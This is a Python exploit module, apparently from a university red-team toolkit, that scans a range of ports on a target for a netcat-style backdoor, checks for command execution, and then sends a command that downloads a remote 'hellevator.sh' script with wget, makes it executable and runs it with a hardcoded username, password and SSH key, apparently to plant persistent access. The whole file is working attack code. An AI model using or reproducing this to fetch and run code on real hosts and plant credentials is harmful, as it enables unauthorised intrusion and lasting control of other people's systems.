import socket
import BetterLogger
from BetterLogger import logger
from Exploit import Exploit

class BackdoorOneNC(Exploit):
	def __init__(self, ip_address, parsed_config) -> None:
		super().__init__(ip_address=ip_address, parsed_config=parsed_config)

	def run_hellevator(self):
		logger.info(f"{self.ip_address} - Running Hellevator via BackdoorOneNC...")
		for port in range(33123, 33100, -1):
			try:
				# logger.debug(f"{self.ip_address} - Connecting to port {port}...")
				socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				socket_connection.settimeout(3)
				socket_connection.connect((self.ip_address, port))
				socket_connection.settimeout(None)
				# logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")

				username = "josh"
				password = "password"
				ssh_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHEVlp/30J0wOuK53YrqMTQ7SduqUw3Mj6R1vfFx76zm josh@parrot"

				download_hellevator_command = f"wget -O hellevator.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/hellevator.sh && chmod +x hellevator.sh && ./hellevator.sh -u '{username}' -p '{password}' -s '{ssh_key}'"
				# logger.debug(f"{self.ip_address} - Running command `{download_hellevator_command}`...")
				socket_connection.sendall(download_hellevator_command.encode())
				socket_connection.shutdown(socket.SHUT_WR)
				socket_response = ""
				while 1:
					data = socket_connection.recv(1024)
					# logger.debug(f"{self.ip_address} - The server responded with `{data}`")
					if len(data) == 0:
						break
					socket_response = data.decode()
				socket_connection.close()
				# logger.debug(f"{self.ip_address} - The server responded with `{socket_response}`")
				if ssh_key in socket_response:
					logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via BackdoorOneNC!{BetterLogger.COLOR_END}")
					return True
				logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorOneNC!{BetterLogger.COLOR_END}")
				return False
			except Exception:
				# logger.debug(f"Failed to connect to port {port}.")
				continue
		logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
		return False

	def run_custom_command(self, command):
		raise NotImplementedError

	def test_if_vulnerable(self):
		logger.info(f"{self.ip_address} - Testing if the target is vulnerable to BackdoorOneNC...")
		for port in range(33123, 33100, -1):
			try:
				# logger.debug(f"{self.ip_address} - Connecting to port {port}...")
				socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				socket_connection.settimeout(3)
				socket_connection.connect((self.ip_address, port))
				socket_connection.settimeout(None)
				# logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")

				exploit_command = "ls /home/elliot" # echo 0x1x2x3 so we can parse for where the actual command injection output begins
				# logger.debug(f"{self.ip_address} - Running command `{exploit_command}`...")
				socket_connection.sendall(exploit_command.encode())
				socket_connection.shutdown(socket.SHUT_WR)
				socket_response = ""
				while 1:
					data = socket_connection.recv(1024)
					if len(data) == 0:
						break
					socket_response = data.decode()
				socket_connection.close()
				# logger.debug(f"{self.ip_address} - The server responded with `{socket_response}`")

				if "Desktop" in socket_response:
					logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to BackdoorOneNC!{BetterLogger.COLOR_END}")
					return True
				logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
				return False
			except Exception:
				# logger.debug(f"Failed to connect to port {port}.")
				continue
		logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
		return False
